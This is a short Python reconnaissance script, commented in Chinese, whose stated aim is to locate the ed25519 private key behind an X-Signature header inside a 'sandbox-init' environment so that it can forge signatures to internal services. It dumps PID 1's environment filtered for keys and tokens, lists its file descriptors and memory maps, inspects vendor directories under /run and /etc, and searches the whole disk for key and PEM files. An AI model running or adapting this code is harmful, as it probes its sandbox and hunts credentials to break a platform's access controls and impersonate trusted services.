# 实验I9: sandbox-init 密钥来源侦察(fd/env/文件系统)
# 目标: 找到 X-Signature (ed25519) 私钥的存储位置 -> 伪造签名调用内部服务
import subprocess, os, glob

def run(cmd, timeout=15):
    try:
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, timeout=timeout)
        return (r.stdout + r.stderr).decode(errors='replace')
    except Exception as e:
        return f"ERR {e}"

print("== [1] pid1 基本信息 ==", flush=True)
print(run("readlink /proc/1/exe; cat /proc/1/cmdline | tr '\\0' ' '; echo; cat /proc/1/status | grep -E 'Name|Uid|Gid|CapEff'"), flush=True)

print("== [2] pid1 环境变量(找密钥/token) ==", flush=True)
env = run("tr '\\0' '\\n' < /proc/1/environ 2>/dev/null")
for line in env.splitlines():
    if any(k in line.upper() for k in ["KEY", "TOKEN", "SECRET", "SIGN", "AUTH", "CRED", "VERCEL", "CERT"]):
        print("  ENV:", line[:200], flush=True)
print(f"  (共 {len(env.splitlines())} 个环境变量)", flush=True)

print("== [3] pid1 打开的文件描述符 ==", flush=True)
print(run("ls -la /proc/1/fd/ 2>&1 | head -30"), flush=True)
print(run("for f in /proc/1/fd/*; do t=$(readlink $f 2>/dev/null); case \"$t\" in *vercel*|*key*|*sock*|*token*|*cert*) echo \"$f -> $t\";; esac; done"), flush=True)

print("== [4] 可疑目录文件列举 ==", flush=True)
print(run("ls -laR /run/vercel/ 2>&1 | head -40"), flush=True)
print(run("ls -la /etc/vercel/ /var/lib/vercel/ /var/vercel/ 2>&1 | head -30"), flush=True)

print("== [5] 全盘搜密钥相关文件 ==", flush=True)
print(run("find / -xdev \\( -name '*.key' -o -name '*.pem' -o -name '*.priv' -o -name '*sign*' -o -name '*ed25519*' -o -name 'key*' \\) -not -path '/proc/*' -not -path '/sys/*' -not -path '/usr/share/*' -not -path '/usr/lib/*' -not -path '/usr/include/*' 2>/dev/null | head -30"), flush=True)

print("== [6] pid1 内存映射中的文件路径(可能有私钥映射) ==", flush=True)
print(run("awk '{print $NF}' /proc/1/maps 2>/dev/null | grep -v '^\\[' | sort -u | head -20"), flush=True)

print("== [7] sandbox-init 自身目录内容 ==", flush=True)
exe = run("readlink /proc/1/exe").strip()
d = os.path.dirname(exe) if exe else "/"
print(f"exe={exe} dir={d}", flush=True)
print(run(f"ls -la {d} 2>&1 | head -20"), flush=True)

print("done", flush=True)
